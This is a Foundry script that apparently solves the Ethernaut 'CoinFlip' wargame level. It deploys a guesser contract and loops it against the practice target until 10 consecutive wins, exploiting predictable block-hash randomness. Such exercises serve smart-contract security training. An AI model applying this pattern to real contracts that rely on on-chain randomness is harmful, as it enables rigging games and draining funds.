// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.6.0 <0.9.0; // flexible is better, no?

import "forge-std/Script.sol";
import "forge-std/console2.sol";
import "src/CoinFlip/CoinFlip.sol";
import "./CoinFlipGuesser.sol";

contract CoinFlipScript is Script {

    address internal attacker;
    address internal deployer;
    CoinFlip target;

    /** 
        SETUP SCENARIO
    */
    function setUp() public {
        uint chainId;
        assembly { chainId := chainid() }
        if (chainId == 5) { //goerli chian
            /** Define addresses  (NO NEED TO CHANGE ANYTHING HERE) **/
            attacker = msg.sender;
            /** Setup contract and required init (you may have to modify this section) **/
            target = CoinFlip(0x0000000000000000000000000000000000000000); //attach to an existing contract
        }else{ // local - chainid = 31137
            /** Define actors (NO NEED TO CHANGE ANYTHING HERE) **/
            deployer = vm.addr(1);
            attacker = vm.addr(1337);
            vm.label(deployer, "Deployer");
            vm.label(attacker, "Attacker");
            /** Airdrop (NO NEED TO CHANGE ANYTHING HERE?) **/
            vm.deal(deployer, 100 ether);
            vm.deal(attacker, 0.5 ether);
            /** Setup contract and required init (you may have to modify this section) **/
            vm.startBroadcast(deployer);
            target = new CoinFlip();
            vm.stopBroadcast();
        }
    }

    /** 
        CODE YOUR EXPLOIT HERE 
        Do not forget to broadcast as the attacker :)
    **/
    function run() public {
        console.log("[Info]");
        console.log("attacker : %s", attacker);
        console.log("wins : %s", target.consecutiveWins());

        console.log("[Exploiting...]");
        
        vm.startBroadcast(attacker);
        CoinFlipGuesser guesser = new CoinFlipGuesser();
        console.log("guesser : %s", address(guesser));
        while(target.consecutiveWins() < 10){
            guesser.guess(address(target));
            console.log("wins : %d", target.consecutiveWins());
            vm.roll(block.number+1);
        }
        vm.stopBroadcast();
    }
}